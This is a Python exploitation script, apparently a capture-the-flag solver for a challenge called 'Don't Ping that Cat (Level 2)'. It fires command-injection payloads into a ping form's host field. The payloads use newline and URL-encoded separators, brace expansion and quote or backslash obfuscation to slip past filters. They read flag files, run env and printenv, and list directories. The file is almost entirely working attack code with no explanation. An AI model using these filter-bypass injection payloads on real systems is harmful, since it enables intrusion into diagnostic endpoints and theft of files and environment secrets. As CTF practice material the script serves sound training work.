#!/usr/bin/env python3
"""
Don't Ping that Cat (Level 2) - Exploitation
Target: https://dont-ping-fiv-ctf.tdho.st/
"""

import requests
from bs4 import BeautifulSoup
import re
import urllib.parse

TARGET = "https://dont-ping-fiv-ctf.tdho.st"

def print_section(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print('='*60)

def test_payload(payload, description=""):
    """Test a payload and return the output"""
    if description:
        print(f"\n[*] {description}")
    print(f"[*] Payload: {payload[:80]}...")
    
    data = {"host": payload}
    
    try:
        resp = requests.post(TARGET, data=data, timeout=15)
        soup = BeautifulSoup(resp.text, 'html.parser')
        result = soup.find('pre')
        
        if result:
            output = result.text
            
            # Check for flag
            if 'TDHT{' in output:
                print(f"\n[!!!] FLAG FOUND!")
                flags = re.findall(r'TDHT\{[^}]+\}', output)
                for flag in flags:
                    print(f"[!!!] FLAG: {flag}")
                return True
            
            # Check for successful execution
            if any(keyword in output for keyword in ['www-data', 'root', 'uid=', 'flag']):
                print(f"[+] SUCCESS! Output:")
                print("-" * 60)
                print(output)
                print("-" * 60)
                return output
            else:
                print(f"[?] Output: {output[:200]}")
                return output
        else:
            print(f"[-] No <pre> element found - likely blocked")
            
            # Check for error messages
            error_div = soup.find('div', class_='error')
            if error_div:
                print(f"[!] Error message: {error_div.text}")
            
            return None
            
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def main():
    print_section("DON'T PING THAT CAT (L2) - EXPLOITATION")
    print(f"Target: {TARGET}")
    
    # Strategy: Use newline as separator since basic separators are blocked
    print_section("TESTING NEWLINE-BASED INJECTION")
    
    # Test with actual newline
    payloads_newline = [
        "8.8.8.8\nwhoami",
        "8.8.8.8\nid",
        "8.8.8.8\nls",
        "8.8.8.8\npwd",
        "8.8.8.8\ncat /tmp/flag.txt",
        "8.8.8.8\ncat /etc/flag.txt",
        "8.8.8.8\ncat /flag.txt",
        "8.8.8.8\ncat flag.txt",
    ]
    
    for payload in payloads_newline:
        result = test_payload(payload)
        if result is True:  # Flag found
            return
    
    # Try URL-encoded newline
    print_section("TESTING URL-ENCODED NEWLINE")
    
    payloads_encoded = [
        "8.8.8.8%0awhoami",
        "8.8.8.8%0aid",
        "8.8.8.8%0acat /tmp/flag.txt",
        "8.8.8.8%0acat /etc/flag.txt",
        "8.8.8.8%0acat /flag.txt",
    ]
    
    for payload in payloads_encoded:
        result = test_payload(payload)
        if result is True:
            return
    
    # Try alternative injection methods
    print_section("TESTING ALTERNATIVE METHODS")
    
    # Bash brace expansion
    alt_payloads = [
        "8.8.8.8\n{cat,/tmp/flag.txt}",
        "8.8.8.8\n{cat,/etc/flag.txt}",
        
        # Using less or more instead of cat
        "8.8.8.8\nless /tmp/flag.txt",
        "8.8.8.8\nmore /tmp/flag.txt",
        "8.8.8.8\nhead /tmp/flag.txt",
        "8.8.8.8\ntail /tmp/flag.txt",
        
        # Using wildcards
        "8.8.8.8\ncat /*/flag.txt",
        "8.8.8.8\ncat /???/flag.txt",
        
        # Using strings command
        "8.8.8.8\nstrings /tmp/flag.txt",
        
        # Using grep to find
        "8.8.8.8\ngrep -r TDHT /tmp",
        "8.8.8.8\ngrep -r TDHT /etc",
        
        # Find command
        "8.8.8.8\nfind / -name flag.txt 2>/dev/null",
        "8.8.8.8\nfind / -name '*flag*' 2>/dev/null",
    ]
    
    for payload in alt_payloads:
        result = test_payload(payload)
        if result is True:
            return
    
    # If cat is filtered, try obfuscation
    print_section("TESTING CAT COMMAND OBFUSCATION")
    
    cat_obfuscation = [
        "8.8.8.8\nc''at /tmp/flag.txt",
        "8.8.8.8\nca\\t /tmp/flag.txt", 
        "8.8.8.8\nc${x}at /tmp/flag.txt",
        "8.8.8.8\n$(echo cat) /tmp/flag.txt",
        "8.8.8.8\n`echo cat` /tmp/flag.txt",
        "8.8.8.8\n\\c\\a\\t /tmp/flag.txt",
        "8.8.8.8\n/bin/cat /tmp/flag.txt",
        "8.8.8.8\n/usr/bin/cat /tmp/flag.txt",
    ]
    
    for payload in cat_obfuscation:
        result = test_payload(payload)
        if result is True:
            return
    
    # Try reading with different methods
    print_section("TESTING ALTERNATIVE READ METHODS")
    
    read_methods = [
        "8.8.8.8\nwhile read line; do echo $line; done < /tmp/flag.txt",
        "8.8.8.8\n< /tmp/flag.txt",
        "8.8.8.8\nprintf '%s\\n' \"$(< /tmp/flag.txt)\"",
        "8.8.8.8\nawk '{print}' /tmp/flag.txt",
        "8.8.8.8\nsed '' /tmp/flag.txt",
        "8.8.8.8\nxargs -a /tmp/flag.txt",
    ]
    
    for payload in read_methods:
        result = test_payload(payload)
        if result is True:
            return
    
    # Search filesystem more broadly
    print_section("SEARCHING FILESYSTEM")
    
    search_payloads = [
        "8.8.8.8\nls -la /",
        "8.8.8.8\nls -la /tmp",
        "8.8.8.8\nls -la /etc",
        "8.8.8.8\nls -la /var/www/html",
        "8.8.8.8\nenv",
        "8.8.8.8\nprintenv",
    ]
    
    for payload in search_payloads:
        result = test_payload(payload)
        if result:
            print(f"\n[+] Got output, analyzing...")

if __name__ == "__main__":
    main()
